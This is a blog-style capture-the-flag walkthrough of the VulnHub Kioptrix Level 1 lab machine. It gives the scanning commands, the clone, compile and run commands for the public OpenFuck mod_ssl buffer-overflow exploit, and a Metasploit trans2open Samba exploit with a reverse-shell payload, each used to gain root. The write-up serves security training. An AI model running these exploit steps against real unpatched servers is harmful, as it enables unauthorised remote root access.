---
layout: post
title: "VulnHub - Kioptrix Level 1"
date: 2022-02-04
categories: [Vulnhub, Easy]
tags: [boot2root]
image: ../../assets/img/posts/Kioptrix Level 1/kioptrix.png 

---

## Description

This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. 

|**Box**|Kioptrix Level 1|
|:---:|:---:|
|**OS**|Linux|
|**Box Link**| https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ |
|**Creator**|[Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)|

---

We'll start with first discovering the IP address of the box using netdiscover tool,

```bash
sudo netdiscover -r 10.0.2.0/24
```

![netdiscover](../../assets/img/posts/Kioptrix Level 1/netdiscover.png)

Okay, so the IP address of the box is 10.0.2.21.

Now, let's start port scanning with **nmap**,

```bash
sudo nmap -A -T4 -p- -oN nmap_scan 10.0.2.21
```

![nmap1](../../assets/img/posts/Kioptrix Level 1/nmap1.png)
![nmap2](../../assets/img/posts/Kioptrix Level 1/nmap2.png)

there are multiple open ports present. We'll enumerate them individually.

Since we know that this box is running a webserver which host a website, so we'll first see how many technologies are running on website with whatweb tool,

```bash
whatweb http://10.0.2.21
```

![whatweb](../../assets/img/posts/Kioptrix Level 1/whatweb.png)

this is running mod_ssl (exploit) impressive :0. Let's enumerate it more.

let's visit http://10.0.2.21,

![web1](../../assets/img/posts/Kioptrix Level 1/web1.png)

that's a simple apache installation text page.

let's visit https://10.0.2.21 as well,

![web2](../../assets/img/posts/Kioptrix Level 1/web2.png)

we can see that this is a same page which we encountered before on port 80.

Let's run **nikto** tool to scan website for vulnerabilities,

```bash
nikto --host http://10.0.2.21
```

![nikto1](../../assets/img/posts/Kioptrix Level 1/nikto1.png)

there are many things to look for but the thing which takes my attention is this website is vulnerable to **mod_ssl 2.8.4 exploit**.

![nikto2](../../assets/img/posts/Kioptrix Level 1/nikto2.png)

We can take a look at this exploit code on https://www.exploit-db.com/exploits/764 and this exploit's name is OpenFuckV2. This mod_ssl vulnerability allows buffer overflow to gain remote shell.

Let's look at the how this exploit work and download this exploit from github https://github.com/heltonWernik/OpenLuck

![web3](../../assets/img/posts/Kioptrix Level 1/web3.png)

follow the steps in usage image from github to fireup the exploit,

```bash
git clone https://github.com/heltonWernik/OpenLuck.git
cd Openluck
sudo apt-get install libssl-dev
compiling exploit,
gcc -o OpenFuck OpenFuck.c -lcrypto
```

let's see how this exploit works,

```bash
./OpenFuck
```

![openluck](../../assets/img/posts/Kioptrix Level 1/openluck.png)

seems like we've to first we've to provide supported offset of the version running on the box.

we'll use RedHat linux 7.2 version offset 0x6b,

```bash
./OpenFuck 0x6b 10.0.2.21 443 -c 41
```

![openluck2](../../assets/img/posts/Kioptrix Level 1/openluck2.png)

we got ROOT!!!

Note: This exploit might take 2-3 tries to get you a shell, so try hard ;).

## Metasploit Method

Let's fireup the metasploit framework using `msfconsole` and we'll look how to exploit this box.

we'll search for samba exploit modules in msfconsole,

```bash
search linux samba
```

![msf1](../../assets/img/posts/Kioptrix Level 1/msf1.png)

okay, so we got trans2open exploit and we're going to use that to gain a system access.

```bash
use exploit/linux/samba/trans2open
```

![msf2](../../assets/img/posts/Kioptrix Level 1/msf2.png)

we can see that our payload is automatically assigned as generic/shell_reverse_tcp, if not, then set it using `set payload generic/shell_reverse_tcp`.

now type `options` to show list of options we have in this module,

![msf3](../../assets/img/posts/Kioptrix Level 1/msf3.png)

here we'll set RHOSTS to our kioptrix box's IP. To set this ip, type `set rhosts 10.0.2.21` and then fireup the module using `exploit`,

![msf4](../../assets/img/posts/Kioptrix Level 1/msf4.png)
![msf5](../../assets/img/posts/Kioptrix Level 1/msf5.png)

we got system shell!!

**Note: After firing up this exploit, it might take some time get root shell. Have patience and if it doesn't work then try again.**

We saw both methods, i.e. Manual method by using OpenFuckV2 exploit and Automated Method using Metasploit Framework to exploit this box.
